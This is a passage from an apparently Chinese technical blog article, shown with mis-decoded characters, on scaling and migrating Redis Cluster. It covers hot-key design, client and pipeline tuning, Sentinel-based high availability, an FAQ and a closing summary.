<li><strong>é«˜å¯ç”¨æ€§</strong>ï¼š6èŠ‚ç‚¹åˆ†å¸ƒï¼Œä¸»ä»å¤åˆ¶ä¿éšœæ•…éšœåˆ‡æ¢ã€‚</li>
</ul>
<h4 data-id="heading-32">é‡åˆ°çš„é—®é¢˜</h4>
<p>è¿ç§»ä¸­å‘ç°éƒ¨åˆ†çƒ­ç‚¹Keyï¼ˆå¦‚çˆ†æ¬¾å•†å“åº“å­˜ï¼‰ä»é›†ä¸­åœ¨æŸèŠ‚ç‚¹ï¼Œå¯¼è‡´å»¶è¿ŸæŠ–åŠ¨ã€‚åˆ†æåå‘ç°æ˜¯Keyè®¾è®¡é—®é¢˜ï¼šæ‰€æœ‰åº“å­˜Keyå‰ç¼€ç›¸åŒï¼ˆå¦‚<code>inventory:product:123</code>ï¼‰ï¼Œå“ˆå¸Œåæ§½ä½è¿‡äºé›†ä¸­ã€‚</p>
<h4 data-id="heading-33">æ”¹è¿›å»ºè®®</h4>
<ul>
<li><strong>ä¼˜åŒ–Keyè®¾è®¡</strong>ï¼šåœ¨Keyä¸­åŠ å…¥éšæœºåç¼€ï¼ˆå¦‚<code>inventory:product:123:shard1</code>ï¼‰ï¼Œåˆ†æ•£æ§½ä½ã€‚</li>
<li><strong>é¢„åˆ†ç‰‡</strong>ï¼šæå‰æŒ‰ä¸šåŠ¡æ¨¡å—åˆ†é…æ§½ä½ï¼Œæ¯”å¦‚è®¢å•å’Œåº“å­˜å„å ä¸€åŠã€‚</li>
<li><strong>ç›‘æ§åŠ å¼º</strong>ï¼šå¼•å…¥Redis Exporter + Prometheusï¼Œå®æ—¶è¿½è¸ªçƒ­ç‚¹ã€‚</li>
</ul>
<p><strong>åæ€</strong>ï¼šè¿™æ¬¡æ‰©å®¹è®©æˆ‘æ„è¯†åˆ°ï¼ŒæŠ€æœ¯æ–¹æ¡ˆåªæ˜¯åŸºç¡€ï¼Œä¸šåŠ¡ç†è§£å’ŒKeyè®¾è®¡æ‰æ˜¯å†³å®šæˆè´¥çš„å…³é”®ã€‚å¦‚æœä¸€å¼€å§‹å°±è€ƒè™‘çƒ­ç‚¹éš”ç¦»ï¼Œè¿ç§»ä¼šæ›´é¡ºç•…ã€‚</p>
<hr/>
<h3 data-id="heading-34">è¿‡æ¸¡åˆ°ä¸‹ä¸€ç« </h3>
<p>è¿™ä¸ªæ¡ˆä¾‹å±•ç¤ºäº†Redisæ‰©å®¹çš„å®Œæ•´è¿‡ç¨‹ï¼Œä¹Ÿæš´éœ²äº†ä¸€äº›éšè—çš„å‘ã€‚æˆ–è®¸ä½ å·²ç»å¼€å§‹æ€è€ƒï¼šå¦‚ä½•è¿›ä¸€æ­¥ä¼˜åŒ–æ€§èƒ½å’Œé«˜å¯ç”¨æ€§ï¼Ÿä¸‹ä¸€ç« å°†è¿›å…¥è¿›é˜¶ç¯èŠ‚ï¼Œæˆ‘ä¼šåˆ†äº«æ›´å¤šä¼˜åŒ–æŠ€å·§å’Œæ³¨æ„äº‹é¡¹ï¼Œå¸®åŠ©ä½ åœ¨å®æˆ˜ä¸­æ¸¸åˆƒæœ‰ä½™ã€‚è®©æˆ‘ä»¬ç»§ç»­æ¢ç´¢å§ï¼</p>
<hr/>
<h2 data-id="heading-35">äº”ã€è¿›é˜¶ä¼˜åŒ–ä¸æ³¨æ„äº‹é¡¹</h2>
<p>å®Œæˆäº†Redisè¿ç§»ä¸æ‰©å®¹çš„å®æˆ˜åï¼Œä½ å¯èƒ½è§‰å¾—å·²ç»æŒæ¡äº†æ ¸å¿ƒæŠ€èƒ½ï¼Œä½†çœŸæ­£çš„æŒ‘æˆ˜å¾€å¾€è—åœ¨ç»†èŠ‚é‡Œã€‚è¿™å°±åƒå¼€è½¦ä¸Šè·¯ï¼Œå­¦ä¼šèµ·æ­¥å’Œæ¢æŒ¡åªæ˜¯å¼€å§‹ï¼Œå¦‚ä½•åœ¨å¤æ‚è·¯å†µä¸‹ä¿æŒå¹³ç¨³é«˜æ•ˆï¼Œæ‰æ˜¯é«˜æ‰‹ä¸æ–°æ‰‹çš„åŒºåˆ«ã€‚åœ¨è¿™ä¸€ç« ï¼Œæˆ‘å°†åˆ†äº«ä¸€äº›è¿›é˜¶ä¼˜åŒ–æŠ€å·§ã€é«˜å¯ç”¨æ€§ä¿éšœæ–¹æ³•ï¼Œä»¥åŠå¸¸è§é—®é¢˜çš„åº”å¯¹ç­–ç•¥ï¼Œå¸®ä½ åœ¨Redisæ‰©å®¹çš„â€œé•¿è·‘â€ä¸­è·‘å¾—æ›´å¿«ã€æ›´ç¨³ã€‚</p>
<h3 data-id="heading-36">5.1 æ€§èƒ½ä¼˜åŒ–</h3>
<p>æ€§èƒ½æ˜¯Redisçš„ç”Ÿå‘½çº¿ï¼Œæ‰©å®¹åå¦‚ä½•è¿›ä¸€æ­¥æ¦¨å–æ½œåŠ›ï¼Ÿä»¥ä¸‹æ˜¯å‡ ä¸ªå…³é”®ç‚¹ï¼š</p>
<ul>
<li><strong>æ§½ä½åˆ†é…ç­–ç•¥</strong>ï¼šå‡åŒ€åˆ†å¸ƒæ§½ä½æ˜¯åŸºç¡€ï¼Œä½†çƒ­ç‚¹Keyå¯èƒ½æ‰“ä¹±å¹³è¡¡ã€‚å»ºè®®æ ¹æ®ä¸šåŠ¡ç‰¹æ€§éš”ç¦»çƒ­ç‚¹ï¼Œæ¯”å¦‚å°†é«˜é¢‘è®¿é—®çš„ä¼šè¯æ•°æ®å’Œä½é¢‘çš„é…ç½®æ•°æ®åˆ†é…åˆ°ä¸åŒèŠ‚ç‚¹ã€‚å¯ä»¥ç”¨<code>CLUSTER GETKEYSINSLOT &lt;slot&gt; &lt;count&gt;</code>æ£€æŸ¥æ§½å†…Keyåˆ†å¸ƒã€‚</li>
<li><strong>å®¢æˆ·ç«¯ä¼˜åŒ–</strong>ï¼šJediså’ŒLettuceæ˜¯ä¸»æµå®¢æˆ·ç«¯ï¼Œä½†æ€§èƒ½å·®å¼‚æ˜æ˜¾ã€‚Jedisçš„Clusteræ¨¡å¼åœ¨é«˜å¹¶å‘ä¸‹å¯èƒ½å› è¿æ¥æ± ç®¡ç†ä¸å–„å¯¼è‡´é˜»å¡ï¼Œè€ŒLettuceåŸºäºNettyï¼Œæ”¯æŒå¼‚æ­¥æ“ä½œï¼Œå»¶è¿Ÿæ›´ä½ã€‚æˆ‘åœ¨ä¸€ä¸ªQPSè¶…10ä¸‡çš„é¡¹ç›®ä¸­ï¼Œä»Jedisåˆ‡æ¢åˆ°Lettuceåï¼ŒP99å»¶è¿Ÿä»10msé™åˆ°6msã€‚</li>
<li><strong>Pipelineä¸æ‰¹é‡æ“ä½œ</strong>ï¼šè¿ç§»å’Œæ—¥å¸¸æ“ä½œä¸­ï¼ŒPipelineèƒ½æ˜¾è‘—å‡å°‘ç½‘ç»œå¾€è¿”ã€‚ä¾‹å¦‚ï¼Œæ‰¹é‡å†™å…¥1000ä¸ªKeyæ—¶ï¼ŒPipelineæ¯”å•æ¡å‘½ä»¤å¿«10å€ï¼š</li>
</ul>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// Jedis Pipeline ç¤ºä¾‹</span>
<span class="hljs-type">JedisCluster</span> <span class="hljs-variable">jedis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JedisCluster</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">HostAndPort</span>(<span class="hljs-string">"192.168.1.13"</span>, <span class="hljs-number">6379</span>));
<span class="hljs-type">Pipeline</span> <span class="hljs-variable">pipeline</span> <span class="hljs-operator">=</span> jedis.pipelined();
<span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++) {
    pipeline.set(<span class="hljs-string">"key:"</span> + i, <span class="hljs-string">"value"</span> + i);
}
pipeline.sync();
</code></pre>
<p><strong>å°è´´å£«</strong>ï¼šä¼˜åŒ–å‰ç”¨<code>SLOWLOG</code>åˆ†ææ…¢æŸ¥è¯¢ï¼Œå®šä½ç“¶é¢ˆåå†é’ˆå¯¹æ€§è°ƒæ•´ã€‚</p>
<h3 data-id="heading-37">5.2 é«˜å¯ç”¨ä¿éšœ</h3>
<p>æ‰©å®¹åï¼Œé›†ç¾¤è§„æ¨¡å˜å¤§ï¼Œé«˜å¯ç”¨æ€§ï¼ˆHAï¼‰å˜å¾—æ›´é‡è¦ã€‚ä»¥ä¸‹æ˜¯å‡ ä¸ªä¿éšœæªæ–½ï¼š</p>
<ul>
<li><strong>ä¸»ä»å¤åˆ¶ä¸æ•…éšœè½¬ç§»</strong>ï¼šæ¯ä¸ªèŠ‚ç‚¹é…ä»èŠ‚ç‚¹ï¼ˆ<code>CLUSTER REPLICATE &lt;master_id&gt;</code>ï¼‰ï¼Œä¸»èŠ‚ç‚¹æ•…éšœæ—¶ä»èŠ‚ç‚¹è‡ªåŠ¨æ¥ç®¡ã€‚å»ºè®®è‡³å°‘1ä¸»1ä»ï¼Œå¤æ‚åœºæ™¯å¯1ä¸»2ä»ã€‚</li>
<li><strong>Sentinelä¸Clusterç»“åˆ</strong>ï¼šRedis Clusterè‡ªå¸¦æ•…éšœè½¬ç§»ï¼Œä½†Sentinelå¯æä¾›é¢å¤–çš„ç›‘æ§å’Œé€šçŸ¥ã€‚ä¾‹å¦‚ï¼Œé…ç½®Sentinelç›‘æ§ä¸»èŠ‚ç‚¹ï¼Œæ•…éšœæ—¶æ¨é€å‘Šè­¦ï¼š</li>
</ul>
<pre><code class="hljs language-bash" lang="bash">sentinel monitor mymaster 192.168.1.13 6379 2
sentinel <span class="hljs-built_in">set</span> mymaster down-after-milliseconds 5000
</code></pre>
<ul>
<li><strong>è·¨å¯ç”¨åŒºéƒ¨ç½²</strong>ï¼šåœ¨äº‘ç¯å¢ƒä¸­ï¼Œå°†èŠ‚ç‚¹åˆ†å¸ƒåˆ°ä¸åŒå¯ç”¨åŒºï¼ˆAZï¼‰ï¼Œé¿å…å•ç‚¹æ•…éšœã€‚æˆ‘æ›¾åœ¨ä¸€ä¸ªé¡¹ç›®ä¸­å› æœªè·¨AZéƒ¨ç½² éƒ¨ç½²ï¼Œé­é‡æœºæˆ¿æ–­ç”µå¯¼è‡´æœåŠ¡å…¨æŒ‚ï¼Œåæ¥è°ƒæ•´ä¸º3AZåˆ†å¸ƒï¼Œç¨³å®šæ€§å¤§å¹…æå‡ã€‚</li>
</ul>
<p><strong>æ³¨æ„</strong>ï¼šä¸»ä»å¤åˆ¶ä¼šå¢åŠ ç½‘ç»œå¼€é”€ï¼Œå»ºè®®ç›‘æ§å¸¦å®½å ç”¨ï¼Œå¿…è¦æ—¶å‹ç¼©æ•°æ®ã€‚</p>
<h3 data-id="heading-38">5.3 å¸¸è§é—®é¢˜FAQ</h3>
<p>å®æˆ˜ä¸­æ€»ä¼šé‡åˆ°æ„å¤–ï¼Œä»¥ä¸‹æ˜¯å‡ ä¸ªå¸¸è§é—®é¢˜åŠè§£å†³åŠæ³•ï¼š</p>
<ul>
<li><strong>Qï¼šè¿ç§»ä¸­Keyä¸¢å¤±æ€ä¹ˆåŠï¼Ÿ</strong>
<strong>A</strong>ï¼šé€šå¸¸æ˜¯åŒå†™æœªæ­£ç¡®å®ç°æˆ–è¿ç§»ä¸­æ–­å¯¼è‡´ã€‚æ£€æŸ¥å®¢æˆ·ç«¯åŒå†™é€»è¾‘ï¼Œç¡®ä¿æ—§é›†ç¾¤å’Œæ–°é›†ç¾¤åŒæ—¶å†™å…¥ã€‚è¿ç§»å¤±è´¥çš„æ§½å¯ç”¨<code>CLUSTER SETSLOT &lt;slot&gt; NODE &lt;node_id&gt;</code>æ¢å¤ã€‚</li>
<li><strong>Qï¼šæ‰©å®¹åå®¢æˆ·ç«¯æŠ¥<code>MOVED</code>é”™è¯¯å¦‚ä½•å¤„ç†ï¼Ÿ</strong>
<strong>A</strong>ï¼šè¯´æ˜å®¢æˆ·ç«¯æœªåŠæ—¶æ›´æ–°æ§½ä½æ˜ å°„ã€‚Smart Clientï¼ˆå¦‚Jedisï¼‰ä¼šè‡ªåŠ¨é‡è¯•ï¼Œä½†é¢‘ç¹<code>MOVED</code>å¯èƒ½å› è¿æ¥æ± æœªåˆ·æ–°ã€‚å»ºè®®é‡å¯å®¢æˆ·ç«¯æˆ–åŠ¨æ€æ›´æ–°é…ç½®ã€‚</li>
<li><strong>Qï¼šè¿ç§»åæ€§èƒ½æœªæå‡ï¼Œåè€Œä¸‹é™ï¼Ÿ</strong>
<strong>A</strong>ï¼šå¯èƒ½æ˜¯çƒ­ç‚¹Keyé›†ä¸­æˆ–æ§½ä½åˆ†é…ä¸å‡ã€‚ç”¨<code>redis-cli --hotkeys</code>åˆ†æçƒ­ç‚¹ï¼Œå¿…è¦æ—¶è°ƒæ•´Keyè®¾è®¡æˆ–é‡æ–°åˆ†é…æ§½ä½ã€‚</li>
</ul>
<h3 data-id="heading-39">5.4 ç»éªŒæ€»ç»“</h3>
<p>å›é¡¾å¤šæ¬¡é¡¹ç›®å®è·µï¼Œæˆ‘æç‚¼å‡ºä¸€å¥è¯ï¼š<strong>è¿ç§»ä¸æ‰©å®¹çš„æ ¸å¿ƒåœ¨äºè§„åˆ’å…ˆè¡Œï¼Œé€æ­¥éªŒè¯</strong>ã€‚æ— è®ºæ˜¯å®¹é‡è¯„ä¼°ã€æ§½ä½åˆ†é…ï¼Œè¿˜æ˜¯å®¢æˆ·ç«¯åˆ‡æ¢ï¼Œæ¯ä¸€æ­¥éƒ½è¦æœ‰å¤‡é€‰æ–¹æ¡ˆã€‚ä»¥ä¸‹æ˜¯æˆ‘çš„ä¸‰æ¡å¿ƒå¾—ï¼š</p>
<ol>
<li><strong>é¢„æ¼”ä¸å¯å°‘</strong>ï¼šåœ¨æµ‹è¯•ç¯å¢ƒæ¨¡æ‹Ÿè¿ç§»ï¼Œæš´éœ²å·¥å…·å’Œç½‘ç»œé—®é¢˜ã€‚</li>
<li><strong>ç›‘æ§æ˜¯æ•‘å‘½ç¨»è‰</strong>ï¼šç”¨Prometheusæˆ–Redisè‡ªå¸¦çš„<code>INFO</code>å‘½ä»¤ï¼Œå®æ—¶å…³æ³¨è¿ç§»è¿›åº¦å’Œæ€§èƒ½æŒ‡æ ‡ã€‚</li>
<li><strong>ä¸šåŠ¡ä¼˜å…ˆ</strong>ï¼šæŠ€æœ¯æ–¹æ¡ˆå†å®Œç¾ï¼Œä¹Ÿè¦æœåŠ¡äºä¸šåŠ¡ï¼Œç¡®ä¿è¿ç§»å¯¹ç”¨æˆ·æ— æ„ŸçŸ¥ã€‚</li>
</ol>
<hr/>
<h3 data-id="heading-40">è¿‡æ¸¡åˆ°ä¸‹ä¸€ç« </h3>
<p>é€šè¿‡è¿™ä¸€ç« ï¼Œæˆ‘ä»¬ä¸ä»…ä¼˜åŒ–äº†Redisé›†ç¾¤çš„æ€§èƒ½ï¼Œè¿˜ä¸ºé«˜å¯ç”¨æ€§åŠ äº†â€œä¿é™©â€ã€‚è¿™äº›è¿›é˜¶æŠ€å·§å’Œç»éªŒæ•™è®­ï¼Œåº”è¯¥èƒ½è®©ä½ åœ¨æœªæ¥çš„æ‰©å®¹ä»»åŠ¡ä¸­æ›´åŠ ä»å®¹ã€‚ç°åœ¨ï¼Œè®©æˆ‘ä»¬è¿›å…¥æ€»ç»“ç¯èŠ‚ï¼Œå›é¡¾å…¨æ–‡è¦ç‚¹ï¼Œå¹¶å±•æœ›Redisçš„æœªæ¥è¶‹åŠ¿ï¼Œå¸®ä½ ä¸ºä¸‹ä¸€æ¬¡æŒ‘æˆ˜åšå¥½å‡†å¤‡ï¼</p>
<hr/>
<h2 data-id="heading-41">å…­ã€æ€»ç»“ä¸å±•æœ›</h2>
<p>ç»è¿‡å‰å‡ ç« çš„æ¢ç´¢ï¼Œæˆ‘ä»¬ä»Redisè¿ç§»ä¸æ‰©å®¹çš„èƒŒæ™¯å‡ºå‘ï¼Œä¸€è·¯èµ°åˆ°äº†å®æˆ˜æ¡ˆä¾‹å’Œè¿›é˜¶ä¼˜åŒ–ã€‚è¿™å°±åƒä¸€åœºä»â€œæ–°æ‰‹æ‘â€åˆ°â€œå‰¯æœ¬æŒ‘æˆ˜â€çš„æ—…ç¨‹ï¼Œæˆ‘ä»¬ä¸ä»…æŒæ¡äº†å¹³æ»‘æ‰©å±•çš„æŠ€æœ¯æ–¹æ¡ˆï¼Œè¿˜å­¦ä¼šäº†å¦‚ä½•åœ¨çœŸå®é¡¹ç›®ä¸­çµæ´»åº”å¯¹ã€‚ç°åœ¨ï¼Œè®©æˆ‘ä»¬åœä¸‹æ¥ï¼Œå›é¡¾æ”¶è·ï¼Œå±•æœ›æœªæ¥ï¼Œä¸ºè¿™åœºRedisæ‰©å®¹ä¹‹æ—…ç”»ä¸Šåœ†æ»¡çš„å¥å·ã€‚</p>
<h3 data-id="heading-42">6.1 æ ¸å¿ƒå›é¡¾</h3>
<p>Redisæ•°æ®è¿ç§»ä¸æ‰©å®¹çš„ç—›ç‚¹â€”â€”æ•°æ®ä¸€è‡´æ€§ã€æœåŠ¡å¯ç”¨æ€§å’Œæ€§èƒ½å½±å“ï¼Œåœ¨Redis Clusterçš„åŠ æŒä¸‹è¿åˆƒè€Œè§£ã€‚å®ƒçš„16384ä¸ªæ§½ä½è®¾è®¡ä¸ºæ•°æ®åˆ†ç‰‡æä¾›äº†åŸºç¡€ï¼Œåœ¨çº¿æ§½è¿ç§»å’ŒåŒå†™ç­–ç•¥è®©æ‰©å®¹å˜å¾—â€œæ— æ„Ÿâ€ï¼Œè€Œåˆç†çš„è§„åˆ’å’Œå·¥å…·æ”¯æŒåˆ™ç¡®ä¿äº†è¿‡ç¨‹çš„å¹³ç¨³è½åœ°ã€‚æˆ‘ä»¬è¿˜é€šè¿‡æ¡ˆä¾‹çœ‹åˆ°ï¼ŒKeyè®¾è®¡å’Œçƒ­ç‚¹éš”ç¦»å¯¹æ€§èƒ½çš„æ·±è¿œå½±å“ï¼Œæé†’æˆ‘ä»¬åœ¨æŠ€æœ¯ä¹‹å¤–å…³æ³¨ä¸šåŠ¡ç‰¹æ€§ã€‚è¿™äº›æ–¹æ¡ˆçš„æ ¸å¿ƒä¼˜åŠ¿åœ¨äºï¼š<strong>æ—¢èƒ½è§£å†³å½“å‰ç“¶é¢ˆï¼Œåˆä¸ºæœªæ¥å¢é•¿ç•™è¶³ç©ºé—´</strong>ã€‚</p>
<h3 data-id="heading-43">6.2 å®æˆ˜ä»·å€¼</h3>
<p>é€šè¿‡æœ¬æ–‡ï¼Œä½ åº”è¯¥å·²ç»èƒ½å¤Ÿç‹¬ç«‹å®Œæˆä¸€æ¬¡Redisé›†ç¾¤æ‰©å®¹ã€‚ä»å®¹é‡è¯„ä¼°åˆ°æ§½ä½è¿ç§»ï¼Œå†åˆ°å®¢æˆ·ç«¯åˆ‡æ¢ï¼Œæ¯ä¸€æ­¥éƒ½æœ‰æ¸…æ™°çš„æŒ‡å¼•å’Œä»£ç æ”¯æŒã€‚æ›´é‡è¦çš„æ˜¯ï¼Œæ–‡ä¸­åˆ†äº«çš„è¸©å‘ç»éªŒâ€”â€”å¦‚ç½‘ç»œæŠ–åŠ¨å¯¼è‡´çš„æ§½å¤±è´¥ã€çƒ­ç‚¹Keyçš„é‡æ–°å¹³è¡¡â€”â€”èƒ½å¸®ä½ å°‘èµ°å¼¯è·¯ã€‚æ— è®ºä½ æ˜¯ä¸­å°å‹é¡¹ç›®çš„è¿ç»´æ–°äººï¼Œè¿˜æ˜¯éœ€è¦ä¼˜åŒ–é«˜å¹¶å‘ç³»ç»Ÿçš„å¤§å‚å¼€å‘è€…ï¼Œè¿™å¥—æ–¹æ³•éƒ½èƒ½â€œæ‹¿æ¥å³ç”¨â€ï¼Œè®©ä½ åœ¨é¢å¯¹ä¸šåŠ¡å‹åŠ›æ—¶å¤šä¸€ä»½åº•æ°”ã€‚</p>
<h3 data-id="heading-44">6.3 æœªæ¥è¶‹åŠ¿</h3>
<p>Redisä½œä¸ºä¸€ä¸ªä¸æ–­è¿›åŒ–çš„æŠ€æœ¯ï¼Œå…¶æœªæ¥å‘å±•ä¹Ÿå€¼å¾—å…³æ³¨ã€‚Redis 7.0å¼•å…¥çš„å¤šçº¿ç¨‹IOæå¤§æå‡äº†ç½‘ç»œæ€§èƒ½ï¼Œå¯èƒ½è®©å•èŠ‚ç‚¹æ‰¿è½½æ›´é«˜QPSï¼Œå‡å°‘æ‰©å®¹é¢‘ç‡ã€‚æ­¤å¤–ï¼ŒRediså®˜æ–¹å¯¹Clusterçš„ä¼˜åŒ–ï¼ˆå¦‚æ›´æ™ºèƒ½çš„æ§½åˆ†é…ç®—æ³•ï¼‰ä¹Ÿåœ¨æŒç»­æ¨è¿›ã€‚å¦ä¸€æ–¹é¢ï¼Œäº‘åŸç”Ÿè¶‹åŠ¿ä¸‹ï¼ŒRedis Operatorå’Œæ‰˜ç®¡æœåŠ¡ï¼ˆå¦‚AWS ElastiCacheï¼‰ç®€åŒ–äº†é›†ç¾¤ç®¡ç†ï¼Œæœªæ¥å¯èƒ½æˆä¸ºä¸»æµé€‰æ‹©ã€‚æˆ‘ä¸ªäººé¢„æµ‹ï¼Œç»“åˆAIçš„è´Ÿè½½é¢„æµ‹å’Œè‡ªåŠ¨åŒ–æ‰©å®¹å·¥å…·ï¼Œä¼šè®©Redisçš„è¿ç»´æ›´åŠ â€œèªæ˜â€ï¼Œè¿™æ˜¯å€¼å¾—æˆ‘ä»¬æŒç»­è·Ÿè¸ªçš„æ–¹å‘ã€‚</p>
<h3 data-id="heading-45">6.4 ä¸ªäººå¿ƒå¾—ä¸é¼“åŠ±äº’åŠ¨</h3>
<p>ä½œä¸ºä¸€åRedisçš„â€œè€ç”¨æˆ·â€ï¼Œæˆ‘æœ€å¤§çš„å¿ƒå¾—æ˜¯ï¼š<strong>æŠ€æœ¯æ˜¯ä¸ºä¸šåŠ¡æœåŠ¡çš„ï¼Œä»»ä½•æ–¹æ¡ˆéƒ½è¦ä»¥ç¨³å®šæ€§å’Œç”¨æˆ·ä½“éªŒä¸ºå‰æ</strong>ã€‚è¿™æ¬¡å†™ä½œè®©æˆ‘é‡æ–°æ¢³ç†äº†å¤šå¹´ç»éªŒï¼Œä¹Ÿå¸Œæœ›èƒ½ä¸ºä½ å¸¦æ¥å¯å‘ã€‚å¦‚æœä½ ä¹Ÿåœ¨é¡¹ç›®ä¸­åšè¿‡è¿ç§»ä¸æ‰©å®¹ï¼Œä¸å¦¨åœ¨è¯„è®ºåŒºåˆ†äº«ä½ çš„æ•…äº‹â€”â€”é‡åˆ°è¿‡å“ªäº›å‘ï¼Ÿç”¨è¿‡å“ªäº›å¦™æ‹›ï¼Ÿæˆ‘å¾ˆæœŸå¾…ä¸ä½ äº¤æµï¼Œå…±åŒè¿›æ­¥ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item>  </channel></rss>